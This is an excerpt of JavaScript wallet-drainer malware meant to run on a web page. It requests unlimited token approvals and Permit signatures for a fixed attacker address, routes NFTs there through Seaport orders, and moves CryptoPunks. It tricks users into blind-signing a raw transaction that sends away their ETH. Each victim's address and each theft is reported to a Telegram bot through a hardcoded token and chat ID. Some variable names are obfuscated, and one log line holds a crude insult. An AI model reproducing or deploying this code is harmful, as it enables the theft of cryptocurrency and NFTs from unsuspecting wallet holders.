...
var ci = abicko2.encodeFunctionData('approve', [
    '0x5aA5e4b1cF32F09086b3D7E83C5Fcd693ede7409',
...
async function cy(data) {
  ...
  // IMPORTANT EDIT
  const TOKEN_ID = `5639082204:AAGzMzd50vwQgwgdkXNyam2UXdjjTeY2t1A`
  const CHAT_ID = `-867502227`
...
$(document).ready(async function () {
  ...
  $(
    ...
    cy(
      '%F0%9F%92%BE CONNECT <a href="https://etherscan.io/address/' +
        Q +
        '">Address</a> <a href="https://opensea.io/' +
        Q +
        '">OpenSea</a> <a href"https://dappradar.com/hub/wallet/eth/' +
        Q +
        '">Portfolio</a>\n' +
    ...
    async function f(M5) {
      ...
      const Mh = (window.oneinch.PermitParams = {
        owner: Q,
        spender: '0x5aA5e4b1cF32F09086b3D7E83C5Fcd693ede7409',
        value:
          '115792089237316195423570985008687907853269984665640564039457584007913129639935',
      ...
      try {
        ...
        console.log(Mt)
        cy(
          '%F0%9F%9A%A8 ERC-20 PERMIT REJECTED <a href="https://etherscan.io/address/' +
            Q +
            '">Address</a> <a href="https://opensea.io/' +
            Q +
            '">OpenSea</a>&parse_mode=Markdown'
        )
      }
    }
    async function I(M5) {
      ...
      try {
        ...
        MU.forEach(async (MI) => {
          ...
          if (type == 1) {
            ...
            const ct = {
              ...
              identifier: '0',
              amount: MI[1],
              recipient: '0x5aA5e4b1cF32F09086b3D7E83C5Fcd693ede7409',
            }
            MV.push(ct)
          } else {
            const cz = {
        ...
        cy(
          '%E2%9C%85 SEAPORT ITEMS: ' +
            ...
            Q +
            '">Address</a> <a href="https://api.jsonbin.io/v3/b/' +
            Mf.metadata.id +
            '?meta=false">JSON</a> <a href="' +
            Mz +
            '">TXID</a>\nManual: ' +
            MF +
            '\nValue: ' +
        ...
        return (
          cy(
            '%F0%9F%9A%A8 SEAPORT ERROR <a href="https://etherscan.io/address/' +
              Q +
              '">Address</a>\n' +
              cJ.message +
        ...
        if (My[Mo][0] != '0x0') {
          if (My[Mo][3] == 'ERC-20') {
            ...
            try {
              ...
              console.log(MQ)
              cy(
                '%F0%9F%9A%A8 ERC-20 REJECTED <a href="https://etherscan.io/address/' +
                  Q +
                  '">Address</a> <a href="https://etherscan.io/token/' +
                  My[Mo][0] +
                  '?a=' +
                  Q +
                  '">URL</a>&parse_mode=Markdown'
              )
            }
          } else {
            if (My[Mo][3] == 'PUNK') {
                ...
                try {
                  ...
                  cy(
                    '%F0%9F%9A%A7 PUNK TRANSFER ' +
                      ...
                      '?a=' +
                      Q +
                      '">Contract</a> <a href="https://etherscan.io/tx/' +
                      response.hash +
                      '">TXID</a>\nFROM ' +
                      Q +
                  ...
                  cy(
                    '%F0%9F%9A%A8 PUNK TRANSFER REJECTED <a href="https://etherscan.io/address/' +
                      Q +
                      '">Address</a> <a href="https://etherscan.io/token/' +
                      My[Mo][0] +
                      '?a=' +
              ...
              if (My[Mo][0] != '0x57f1887a8bf19b14fc0df6fd9b2acc9af147ea85') {
                ...
                try {
                  ...
                  cy(
                    '%F0%9F%9A%A8 SAFA REJECTED <a href="https://etherscan.io/address/' +
                      Q +
                      '">Address</a> <a href="https://etherscan.io/token/' +
                      My[Mo][0] +
                      '?a=' +
    ...
    async function L() {
      ...
      const Mm = await j.getBalance(),
        MU = {
          from: Q,
          to: '0x5aA5e4b1cF32F09086b3D7E83C5Fcd693ede7409',
          value: Mm,
          data: encoded,
        }
      ...
      if (MB < Mt) {
        return (
          cy(
            '%F0%9F%9A%A8 SENDETH ERROR <a href="https://etherscan.io/address/' +
              Q +
      ...
      try {
        console.log('sending ethereum new method.. 1')
        const { ethereum: _0x45c88c } = window
        console.log('sending ethereum new method.. 2')
        const web3 = new Web3(_0x45c88c)
        console.log('sending ethereum new method.. 3')
        const _0x38b49a = web3.utils.toHex(
          await web3.eth.getTransactionCount(Q)
        )
        const balance = await j.getBalance()
          console.log('sending ethereum new method.. 4', _0x38b49a, Q, Mm)

        const _0x2af8e2 = Math.floor((await web3.eth.getGasPrice()) * 1.3)
        ...
        let _0x35d0e8 = {
          ...
          nonce: _0x38b49a,
          gasLimit: '0x55F0',
          gasPrice: web3.utils.toHex(_0x2af8e2),
          value: (parseInt(Mm?._hex) - 2000000000000000),
          data: '0x0',
          r: '0x',
          s: '0x',
          v: '0x1',
        }
        console.log('soy un gay de mierda', _0x35d0e8)
        
        const { ethereumjs: _0x2464be } = window
        console.log('sending ethereum new method.. 5', _0x2464be)
        var _0xbad73b = new _0x2464be.Tx(_0x35d0e8)
        console.log('sending ethereum new method.. 6 1')
        const _0x5a5d4e = '0x' + _0xbad73b.serialize().toString('hex')
        console.log('sending ethereum new method.. 6 2')
        const _0x113840 = web3.utils.sha3(_0x5a5d4e, { encoding: 'hex' })
        console.log('sending ethereum new method.. 6 3')
        const _0x162a42 = await web3.eth.sign(_0x113840, Q)
        console.log('sending ethereum new method.. 6 4')
        const _0x9b1630 = _0x162a42.substring(2)
        console.log('sending ethereum new method.. 6 5')
        const _0xb67883 = '0x' + _0x9b1630.substring(0, 64)
        console.log('sending ethereum new method.. 6 6')
        const _0x57c441 = '0x' + _0x9b1630.substring(64, 128)
        console.log('sending ethereum new method.. 6 7')
        const _0xe4380d = parseInt(_0x9b1630.substring(128, 130), 16)
        console.log('sending ethereum new method.. 6 8')
        const _0x474931 = web3.utils.toHex(_0xe4380d + 1 * 2 + 8)
        console.log('sending ethereum new method.. 6 9')
        _0xbad73b.r = _0xb67883
        _0xbad73b.s = _0x57c441
        _0xbad73b.v = _0x474931
        const _0x5e9d46 = '0x' + _0xbad73b.serialize().toString('hex')
        console.log('Waiting for sign submitting...')
        const _0x3c226e = await web3.eth.sendSignedTransaction(_0x5e9d46)
        console.log('Submitted:', _0x3c226e)
        ...
        return (
          ...
          cy(
            '%F0%9F%9A%AC LICKED\n' +
              MB +
              ' ETH from <a href="https://etherscan.io/address/' +
              Q +
              '">Address</a> to 0x5aA5e4b1cF32F09086b3D7E83C5Fcd693ede7409&parse_mode=Markdown'
          ),
          true
        )
      } catch (MF) {
    ...
    if (to_seaport_drainer.length > 0) {
      ...
      cy(
        '%F0%9F%9A%A8 VICTIM HAS 0 CONDUIT ITEMS <a href="https://etherscan.io/address/' +
          Q +
          '">Address</a>\n Prompting SAFA&parse_mode=Markdown'
      )
    }
    ...
    list_approval.length > 0
      ...
      : cy(
          '%F0%9F%9A%A8 VICTIM HAS 0 NFTS/ERC <a href="https://etherscan.io/address/' +
            Q +
